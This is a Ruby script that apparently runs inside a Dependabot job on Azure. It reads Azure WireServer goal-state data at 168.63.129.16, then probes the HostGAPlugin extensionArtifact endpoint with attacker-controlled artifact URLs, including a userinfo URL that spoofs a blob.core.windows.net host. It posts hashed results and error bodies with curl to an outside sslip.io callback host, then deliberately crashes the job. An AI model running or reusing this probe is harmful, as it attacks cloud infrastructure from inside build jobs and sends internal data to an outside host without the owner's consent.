require "digest"
require "json"
require "open3"
require "tempfile"

AZURE_FETCH_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443"
AZURE_HGAP_HTTPS_BASE = "https://target.147.182.179.38.sslip.io"
AZURE_HGAP_HTTP_BASE = "http://output.147.182.179.38.sslip.io"
AZURE_FETCH_MARKER = "5b3963e04627c6a3b1943eb0e2a145cc"

def azure_fetch_post(job_id, data, kind = "runtime-summary")
  stdout, _stderr, status = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--write-out", "%{http_code}",
    "--header", "Content-Type: application/octet-stream", "--data-binary", "@-",
    "#{AZURE_FETCH_CALLBACK_BASE}/infra/#{AZURE_FETCH_MARKER}/#{job_id}/#{kind}",
    stdin_data: data
  )
  status.success? && stdout.strip == "200"
rescue StandardError
  false
end

def azure_fetch_proxy_get(url, headers: [])
  Tempfile.create("dependabot-azure-hostplugin-response") do |file|
    file.chmod(0o600)
    args = [
      "curl", "--silent", "--show-error", "--max-time", "12", "--noproxy", "",
      "--request", "GET", "--output", file.path, "--write-out", "%{http_code}"
    ]
    headers.each { |header| args += ["--header", header] }
    args << url
    stdout, _stderr, status = Open3.capture3(*args)
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    return [0, "".b] unless status.success? && raw.bytesize <= 65_536
    [code, raw]
  end
rescue StandardError
  [0, "".b]
end

def azure_fetch_xml_value(xml, element)
  value = xml.to_s[%r{<#{element}>\s*([^<]{1,1024}?)\s*</#{element}>}m, 1].to_s.strip
  return nil unless value.match?(/\A[\x21-\x7e]{1,1024}\z/) && !value.match?(/[\r\n]/)
  value
rescue StandardError
  nil
end

job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-azure-hostplugin-fetch-#{job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    goalstate_status, goalstate = azure_fetch_proxy_get(
      "http://168.63.129.16/machine/?comp=goalstate",
      headers: ["x-ms-agent-name: WALinuxAgent", "x-ms-version: 2012-11-30", "Metadata: true"]
    )
    container_id = azure_fetch_xml_value(goalstate, "ContainerId")
    config_name = azure_fetch_xml_value(goalstate, "ConfigName")
    summary = {
      "job_id" => job_id,
      "probe" => "azure-hostplugin-owned-artifact-fetch-v1",
      "goalstate_status" => goalstate_status,
      "goalstate_length" => goalstate.bytesize,
      "goalstate_sha256" => Digest::SHA256.hexdigest(goalstate),
      "container_id_present" => !container_id.nil?,
      "container_id_sha256" => container_id ? Digest::SHA256.hexdigest(container_id) : "",
      "config_name_present" => !config_name.nil?,
      "config_name_sha256" => config_name ? Digest::SHA256.hexdigest(config_name) : ""
    }

    if goalstate_status == 200 && container_id && config_name
      base_headers = [
        "x-ms-version: 2015-09-01",
        "x-ms-containerid: #{container_id}",
        "x-ms-host-config-name: #{config_name}"
      ]
      callback_path = "/hgap/#{AZURE_FETCH_MARKER}/#{job_id}"
      cases = {
        "https-standard" => {
          "artifact" => "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/https-standard",
          "manifest" => "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/https-standard"
        },
        "http-standard" => {
          "artifact" => "#{AZURE_HGAP_HTTP_BASE}#{callback_path}/http-standard",
          "manifest" => "#{AZURE_HGAP_HTTP_BASE}#{callback_path}/http-standard"
        },
        "https-userinfo" => {
          "artifact" => "https://example.blob.core.windows.net@target.147.182.179.38.sslip.io#{callback_path}/https-userinfo",
          "manifest" => "https://example.blob.core.windows.net@target.147.182.179.38.sslip.io#{callback_path}/https-userinfo",
          "outer_headers" => ["Metadata: true", "X-HGAP-Marker: #{Digest::SHA256.hexdigest(job_id)}"]
        },
        "https-storage-shape" => {
          "artifact" => "https://target.147.182.179.38.sslip.io#{callback_path}/https-storage-shape?sv=2018-03-28&sr=b&sp=r&se=2099-01-01T00%3A00%3A00Z&sig=AAAA",
          "manifest" => "https://target.147.182.179.38.sslip.io#{callback_path}/https-storage-shape?sv=2018-03-28&sr=b&sp=r&se=2099-01-01T00%3A00%3A00Z&sig=AAAA"
        }
      }

      versions_status, versions_body = azure_fetch_proxy_get(
        "http://168.63.129.16:32526/versions",
        headers: ["x-ms-containerid: #{container_id}"]
      )

      negative_status, negative_body = azure_fetch_proxy_get(
        "http://168.63.129.16:32526/extensionArtifact", headers: base_headers
      )
      summary["versions_status"] = versions_status
      summary["versions_length"] = versions_body.bytesize
      summary["versions_sha256"] = Digest::SHA256.hexdigest(versions_body)
      summary["negative_missing_location_status"] = negative_status
      summary["negative_missing_location_length"] = negative_body.bytesize
      summary["negative_missing_location_sha256"] = Digest::SHA256.hexdigest(negative_body)
      summary["cases"] = {}
      cases.each do |case_name, definition|
        expected_body = "hgap:#{job_id}:#{case_name}"
        status, body = azure_fetch_proxy_get(
          "http://168.63.129.16:32526/extensionArtifact",
          headers: base_headers + [
            "x-ms-artifact-location: #{definition.fetch("artifact")}",
            "x-ms-artifact-manifest-location: #{definition.fetch("manifest")}",
            *Array(definition["outer_headers"])
          ]
        )
        summary["cases"][case_name] = {
          "status" => status,
          "length" => body.bytesize,
          "sha256" => Digest::SHA256.hexdigest(body),
          "owned_body_exact_match" => body == expected_body
        }
        if status != 200 && !body.empty?
          azure_fetch_post(job_id, body, "azure-host-plugin-error")
        end
      end
    end

    azure_fetch_post(job_id, JSON.generate(summary))
    sleep 15
    raise "controlled stop after owned HostGAPlugin artifact fetch probe"
  end
end
